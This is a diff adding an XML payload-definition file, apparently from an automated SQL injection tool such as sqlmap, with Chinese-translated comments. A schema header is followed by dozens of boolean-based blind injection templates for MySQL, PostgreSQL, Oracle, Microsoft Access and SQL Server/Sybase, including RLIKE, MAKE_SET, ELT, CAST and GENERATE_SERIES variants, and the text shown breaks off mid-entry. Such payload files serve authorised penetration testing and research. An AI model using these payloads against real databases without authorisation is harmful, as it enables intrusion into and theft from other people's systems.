@@ -1,0 +1,1540 @@
+<?xml version="1.0" encoding="UTF-8"?>
+
+<!--
+Tag: <test>
+    SQL注入测试定义.
+
+    Sub-tag: <title>
+        Title of the test.
+
+    Sub-tag: <stype>
+        SQL注入类型.
+
+        Valid values有效值:
+            1: Boolean-based blind SQL injection；基于布尔的SQL盲注
+            2: Error-based queries SQL injection；基于错误的查询SQL注入
+            3: Inline queries SQL injection；内联查询SQL注入
+            4: Stacked queries SQL injection；堆叠(多语句)查询SQL注入
+            5: Time-based blind SQL injection；基于时间的SQL盲注
+            6: UNION query SQL injection；UNION查询SQL注入
+    Sub-tag: <level>
+        检查测试等级
+
+        有效值：
+             1：总是（<100个请求）
+             2：尝试一下（100-200个请求）
+             3：良好的请求数（200-500个请求）
+             4：广泛的测试（500-1000个请求）
+             5：你有足够的时间（> 1000个请求）
+
+    Sub-tag: <risk>
+        payload损坏数据完整性的可能性。
+
+        有效值：
+             1：风险低
+             2：中等风险
+             3：高风险
+
+    Sub-tag: <clause>
+        在哪个子句中，payload可以工作.
+
+        注意：例如，有一些payload一经识别，就不需要进行测试，无论注入是否在WHERE子句条件.
+
+        Valid values:
+            0: Always
+            1: WHERE / HAVING
+            2: GROUP BY
+            3: ORDER BY
+            4: LIMIT
+            5: OFFSET
+            6: TOP
+            7: Table name
+            8: Column name
+            9: Pre-WHERE (non-query)
+
+        可以用逗号分隔这些值的列表。
+
+    Sub-tag: <where>
+        在哪里添加我们的 '<prefix> <payload><comment> <suffix>' 字符串
+
+        有效值：
+             1：将字符串附加到参数原始值，例如：id = 1 => id = 1'
+             2：将参数原始值替换为负随机整数值，并附加我们的字符串。例如：id = 1 => id = -3215648431321'
+             3：用我们的字符串替换参数原始值，例如：id = 1 => id = '
+
+    Sub-tag: <vector>
+        用来利用注入点的payload
+
+    Sub-tag: <request>
+        为这个测试注入什么东西
+
+        Sub-tag: <payload>
+            测试的payload.
+
+        Sub-tag: <comment>
+            在后缀之前添加到payload的注释。
+
+        Sub-tag: <char>
+            用于在UNION查询SQL注入测试中强制使用列数的字符。
+
+        Sub-tag: <columns>
+            在UNION查询SQL注入测试中测试的列的范围.
+
+    Sub-tag: <response>
+        如何识别注入的payload是否成功。
+
+        Sub-tag: <comparison>
+            使用此字符串执行请求作为payload，并将response与<payload>response进行比较。 应用比较算法。
+
+                注意：有用的测试基于SQL布尔的盲注。
+
+        Sub-tag: <grep>
+            在响应体response body中用grep进行正则表达式。
+
+            注意：有用的测试基于错误的SQL注入。
+
+        Sub-tag: <time>
+            返回响应之前等待的时间（秒）。
+
+            注意：有用的测试基于时间的盲注和堆叠(多语句)查询SQL注入。
+
+        Sub-tag: <union>
+            调用unionTest()函数。
+            注意：用于测试UNION查询（带内inband）SQL注入是有用的。
+
+    Sub-tag: <details>
+        如果payload成功，哪些细节可能是有意义的。.
+
+        Sub-tags: <dbms>
+            数据库管理系统（例如MySQL）
+        Sub-tags: <dbms_version>
+            数据库管理系统版本（例如5.0.51）
+        Sub-tags: <os>
+            底层操作系统的数据库管理系统
+
+    <test>
+        <title></title>
+        <stype></stype>
+        <level></level>
+        <risk></risk>
+        <clause></clause>
+        <where></where>
+        <vector></vector>
+        <request>
+            <payload></payload>
+            <comment></comment>
+            <char></char>
+            <columns></columns>
+        </request>
+        <response>
+            <comparison></comparison>
+            <grep></grep>
+            <time></time>
+            <union></union>
+        </response>
+        <details>
+            <dbms></dbms>
+            <dbms_version></dbms_version>
+            <os></os>
+        </details>
+    </test>
+-->
+
+<root>
+    <!-- 基于布尔的盲注测试 - WHERE和HAVING子句 -->
+    <test>
+        <title>基于布尔的盲注 - AND</title>
+        <stype>1</stype><!-- SQL的6种注入类型 -->
+        <level>1</level><!-- 测试等级 -->
+        <risk>1</risk><!-- 风险等级 -->
+        <clause>1,9</clause><!-- 所选用哪个boolean子句 -->
+        <where>1</where><!-- 我们想附加还是替换原始字符串 -->
+        <vector>AND [INFERENCE]</vector>
+        <request>
+            <payload>AND [RANDNUM]=[RANDNUM]</payload>
+        </request>
+        <response>
+            <comparison>AND [RANDNUM]=[RANDNUM1]</comparison>
+        </response>
+    </test>
+
+    <test>
+        <title>基于布尔的盲注 - OR</title>
+        <stype>1</stype>
+        <level>1</level>
+        <risk>3</risk>
+        <clause>1,9</clause>
+        <where>2</where>
+        <vector>OR [INFERENCE]</vector>
+        <request>
+            <payload>OR [RANDNUM]=[RANDNUM]</payload>
+        </request>
+        <response>
+            <comparison>OR [RANDNUM]=[RANDNUM1]</comparison>
+        </response>
+    </test>
+
+    <test>
+        <title>基于布尔的盲注 - OR NOT</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1,9</clause>
+        <where>1</where>
+        <vector>OR NOT [INFERENCE]</vector>
+        <request>
+            <payload>OR NOT [RANDNUM]=[RANDNUM]</payload>
+        </request>
+        <response>
+            <comparison>OR NOT [RANDNUM]=[RANDNUM1]</comparison>
+        </response>
+    </test>
+
+    <test>
+        <title>AND 基于布尔的盲注 - WHERE or HAVING clause (添加(-- -)注释)</title>
+        <stype>1</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <vector>AND [INFERENCE]</vector>
+        <request>
+            <payload>AND [RANDNUM]=[RANDNUM]</payload>
+            <comment>[GENERIC_SQL_COMMENT]</comment>
+        </request>
+        <response>
+            <comparison>AND [RANDNUM]=[RANDNUM1]</comparison>
+        </response>
+    </test>
+
+    <test>
+        <title>OR 基于布尔的盲注 - WHERE or HAVING clause (添加(-- -)注释)</title>
+        <stype>1</stype>
+        <level>2</level>
+        <risk>3</risk>
+        <clause>1</clause>
+        <where>2</where>
+        <vector>OR [INFERENCE]</vector>
+        <request>
+            <payload>OR [RANDNUM]=[RANDNUM]</payload>
+            <comment>[GENERIC_SQL_COMMENT]</comment>
+        </request>
+        <response>
+            <comparison>OR [RANDNUM]=[RANDNUM1]</comparison>
+        </response>
+    </test>
+
+    <test>
+        <title>OR 基于布尔的盲注 - WHERE or HAVING clause (添加(-- -)注释) (NOT)</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>3</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <vector>OR NOT [INFERENCE]</vector>
+        <request>
+            <payload>OR NOT [RANDNUM]=[RANDNUM]</payload>
+            <comment>[GENERIC_SQL_COMMENT]</comment>
+        </request>
+        <response>
+            <comparison>OR NOT [RANDNUM]=[RANDNUM1]</comparison>
+        </response>
+    </test>
+
+    <test>
+        <title>基于布尔的盲注 - AND和WHERE或HAVING子句 (添加MySQL注释#)</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <vector>AND [INFERENCE]</vector>
+        <request>
+            <payload>AND [RANDNUM]=[RANDNUM]</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <comparison>AND [RANDNUM]=[RANDNUM1]</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>OR 基于布尔的盲注 - WHERE or HAVING clause (添加MySQL注释#)</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1</clause>
+        <where>2</where>
+        <vector>OR [INFERENCE]</vector>
+        <request>
+            <payload>OR [RANDNUM]=[RANDNUM]</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <comparison>OR [RANDNUM]=[RANDNUM1]</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>OR 基于布尔的盲注 - WHERE or HAVING clause (添加MySQL注释#) (NOT)</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <vector>OR NOT [INFERENCE]</vector>
+        <request>
+            <payload>OR NOT [RANDNUM]=[RANDNUM]</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <comparison>OR NOT [RANDNUM]=[RANDNUM1]</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>基于布尔的盲注 - AND和WHERE或HAVING子句 (添加Microsoft Access注释%16)</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <vector>AND [INFERENCE]</vector>
+        <request>
+            <payload>AND [RANDNUM]=[RANDNUM]</payload>
+            <comment>%16</comment>
+        </request>
+        <response>
+            <comparison>AND [RANDNUM]=[RANDNUM1]</comparison>
+        </response>
+        <details>
+            <dbms>Microsoft Access</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>OR 基于布尔的盲注 - WHERE or HAVING clause (添加Microsoft Access注释%16)</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1</clause>
+        <where>2</where>
+        <vector>OR [INFERENCE]</vector>
+        <request>
+            <payload>OR [RANDNUM]=[RANDNUM]</payload>
+            <comment>%16</comment>
+        </request>
+        <response>
+            <comparison>OR [RANDNUM]=[RANDNUM1]</comparison>
+        </response>
+        <details>
+            <dbms>Microsoft Access</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL RLIKE 基于布尔的盲注 - WHERE, HAVING, ORDER BY or GROUP BY clause</title>
+        <stype>1</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>1</where>
+        <vector>RLIKE (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 0x28 END))</vector>
+        <request>
+            <payload>RLIKE (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 0x28 END))</payload>
+        </request>
+        <response>
+            <comparison>RLIKE (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE 0x28 END))</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL AND 基于布尔的盲注 - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>1</where>
+        <vector>AND MAKE_SET([INFERENCE],[RANDNUM])</vector>
+        <request>
+            <payload>AND MAKE_SET([RANDNUM]=[RANDNUM],[RANDNUM1])</payload>
+        </request>
+        <response>
+            <comparison>AND MAKE_SET([RANDNUM]=[RANDNUM1],[RANDNUM1])</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL OR 基于布尔的盲注 - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1,2,3</clause>
+        <where>2</where>
+        <vector>OR MAKE_SET([INFERENCE],[RANDNUM])</vector>
+        <request>
+            <payload>OR MAKE_SET([RANDNUM]=[RANDNUM],[RANDNUM1])</payload>
+        </request>
+        <response>
+            <comparison>OR MAKE_SET([RANDNUM]=[RANDNUM1],[RANDNUM1])</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL AND 基于布尔的盲注 - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>1</where>
+        <vector>AND ELT([INFERENCE],[RANDNUM])</vector>
+        <request>
+            <payload>AND ELT([RANDNUM]=[RANDNUM],[RANDNUM1])</payload>
+        </request>
+        <response>
+            <comparison>AND ELT([RANDNUM]=[RANDNUM1],[RANDNUM1])</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL OR 基于布尔的盲注 - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>3</risk>
+        <clause>1,2,3</clause>
+        <where>2</where>
+        <vector>OR ELT([INFERENCE],[RANDNUM])</vector>
+        <request>
+            <payload>OR ELT([RANDNUM]=[RANDNUM],[RANDNUM1])</payload>
+        </request>
+        <response>
+            <comparison>OR ELT([RANDNUM]=[RANDNUM1],[RANDNUM1])</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL AND 基于布尔的盲注 - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)</title>
+        <stype>1</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>1</where>
+        <vector>AND ([INFERENCE])*[RANDNUM]</vector>
+        <request>
+            <payload>AND ([RANDNUM]=[RANDNUM])*[RANDNUM1]</payload>
+        </request>
+        <response>
+            <comparison>AND ([RANDNUM]=[RANDNUM1])*[RANDNUM1]</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL OR 基于布尔的盲注 - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)</title>
+        <stype>1</stype>
+        <level>5</level>
+        <risk>3</risk>
+        <clause>1,2,3</clause>
+        <where>2</where>
+        <vector>OR ([INFERENCE])*[RANDNUM]</vector>
+        <request>
+            <payload>OR ([RANDNUM]=[RANDNUM])*[RANDNUM1]</payload>
+        </request>
+        <response>
+            <comparison>OR ([RANDNUM]=[RANDNUM1])*[RANDNUM1]</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL 基于布尔的盲注 - AND和WHERE或HAVING子句 (CAST)</title>
+        <stype>1</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <vector>AND (SELECT (CASE WHEN ([INFERENCE]) THEN NULL ELSE CAST('[RANDSTR]' AS NUMERIC) END)) IS NULL</vector>
+        <request>
+            <payload>AND (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CAST('[RANDSTR]' AS NUMERIC) END)) IS NULL</payload>
+        </request>
+        <response>
+            <comparison>AND (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN NULL ELSE CAST('[RANDSTR]' AS NUMERIC) END)) IS NULL</comparison>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL OR 基于布尔的盲注 - WHERE or HAVING clause (CAST)</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1</clause>
+        <where>2</where>
+        <vector>OR (SELECT (CASE WHEN ([INFERENCE]) THEN NULL ELSE CAST('[RANDSTR]' AS NUMERIC) END)) IS NULL</vector>
+        <request>
+            <payload>OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CAST('[RANDSTR]' AS NUMERIC) END)) IS NULL</payload>
+        </request>
+        <response>
+            <comparison>OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN NULL ELSE CAST('[RANDSTR]' AS NUMERIC) END)) IS NULL</comparison>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle 基于布尔的盲注 - AND和WHERE或HAVING子句 (CTXSYS.DRITHSX.SN)</title>
+        <stype>1</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <vector>AND (SELECT (CASE WHEN ([INFERENCE]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL</vector>
+        <request>
+            <payload>AND (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL</payload>
+        </request>
+        <response>
+            <comparison>AND (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL</comparison>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle OR 基于布尔的盲注 - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1</clause>
+        <where>2</where>
+        <vector>OR (SELECT (CASE WHEN ([INFERENCE]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL</vector>
+        <request>
+            <payload>OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL</payload>
+        </request>
+        <response>
+            <comparison>OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL</comparison>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+    <!-- 基于布尔的盲注测试结束 - WHERE or HAVING clause -->
+
+    <!-- 基于布尔的盲注 tests - 参数替换 -->
+    <test>
+        <title>MySQL &gt;= 5.0 基于布尔的盲注 - 参数替换</title>
+        <stype>1</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</vector>
+        <request>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</payload>
+        </request>
+        <response>
+            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.0 基于布尔的盲注 - 参数替换(原始值)</title>
+        <stype>1</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</vector>
+        <request>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</payload>
+        </request>
+        <response>
+            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &lt; 5.0 基于布尔的盲注 - 参数替换</title>
+        <stype>1</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</vector>
+        <request>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</payload>
+        </request>
+        <response>
+            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&lt; 5.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &lt; 5.0 基于布尔的盲注 - 参数替换 (原始值)</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</vector>
+        <request>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</payload>
+        </request>
+        <response>
+            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&lt; 5.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL 基于布尔的盲注 - 参数替换 (MAKE_SET)</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>MAKE_SET([INFERENCE],[RANDNUM])</vector>
+        <request>
+            <payload>MAKE_SET([RANDNUM]=[RANDNUM],[RANDNUM1])</payload>
+        </request>
+        <response>
+            <comparison>MAKE_SET([RANDNUM]=[RANDNUM1],[RANDNUM1])</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL 基于布尔的盲注 - 参数替换 (MAKE_SET - 原始值)</title>
+        <stype>1</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>MAKE_SET([INFERENCE],[ORIGVALUE])</vector>
+        <request>
+            <payload>MAKE_SET([RANDNUM]=[RANDNUM],[ORIGVALUE])</payload>
+        </request>
+        <response>
+            <comparison>MAKE_SET([RANDNUM]=[RANDNUM1],[ORIGVALUE])</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL 基于布尔的盲注 - 参数替换 (ELT)</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>ELT([INFERENCE],[RANDNUM])</vector>
+        <request>
+            <payload>ELT([RANDNUM]=[RANDNUM],[RANDNUM1])</payload>
+        </request>
+        <response>
+            <comparison>ELT([RANDNUM]=[RANDNUM1],[RANDNUM1])</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL 基于布尔的盲注 - 参数替换 (ELT - 原始值)</title>
+        <stype>1</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>ELT([INFERENCE],[ORIGVALUE])</vector>
+        <request>
+            <payload>ELT([RANDNUM]=[RANDNUM],[ORIGVALUE])</payload>
+        </request>
+        <response>
+            <comparison>ELT([RANDNUM]=[RANDNUM1],[ORIGVALUE])</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL 基于布尔的盲注 - 参数替换 (bool*int)</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>([INFERENCE])*[RANDNUM]</vector>
+        <request>
+            <payload>([RANDNUM]=[RANDNUM])*[RANDNUM1]</payload>
+        </request>
+        <response>
+            <comparison>([RANDNUM]=[RANDNUM1])*[RANDNUM1]</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL 基于布尔的盲注 - 参数替换 (bool*int - 原始值)</title>
+        <stype>1</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>([INFERENCE])*[ORIGVALUE]</vector>
+        <request>
+            <payload>([RANDNUM]=[RANDNUM])*[ORIGVALUE]</payload>
+        </request>
+        <response>
+            <comparison>([RANDNUM]=[RANDNUM1])*[ORIGVALUE]</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL 基于布尔的盲注 - 参数替换</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE 1/(SELECT 0) END))</vector>
+        <request>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 1/(SELECT 0) END))</payload>
+        </request>
+        <response>
+            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE 1/(SELECT 0) END))</comparison>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL 基于布尔的盲注 - 参数替换 (原始值)</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))</vector>
+        <request>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))</payload>
+        </request>
+        <response>
+            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))</comparison>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+
+    <!-- 由于GENERATE_SERIES()函数的语法，'then'条件必须为1，不要更改它 -->
+    <test>
+        <title>PostgreSQL 基于布尔的盲注 - 参数替换 (GENERATE_SERIES)</title>
+        <stype>1</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>(SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([INFERENCE]) THEN 1 ELSE 0 END) LIMIT 1)</vector>
+        <request>
+            <payload>(SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)</payload>
+        </request>
+        <response>
+            <comparison>(SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE 0 END) LIMIT 1)</comparison>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+
+    <!-- 于GENERATE_SERIES()函数的语法，'then'条件必须为1，不要更改它 -->
+    <test>
+        <title>PostgreSQL 基于布尔的盲注 - 参数替换 (GENERATE_SERIES - 原始值)</title>
+        <stype>1</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>(SELECT [ORIGVALUE] FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([INFERENCE]) THEN 1 ELSE 0 END) LIMIT 1)</vector>
+        <request>
+            <payload>(SELECT [ORIGVALUE] FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)</payload>
+        </request>
+        <response>
+            <comparison>(SELECT [ORIGVALUE] FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE 0 END) LIMIT 1)</comparison>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase 基于布尔的盲注 - 参数替换</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,3</clause>
+        <where>3</where>
+        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</vector>
+        <request>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</payload>
+        </request>
+        <response>
+            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</comparison>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+            <os>Windows</os>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase 基于布尔的盲注 - 参数替换 (原始值)</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1,3</clause>
+        <where>3</where>
+        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</vector>
+        <request>
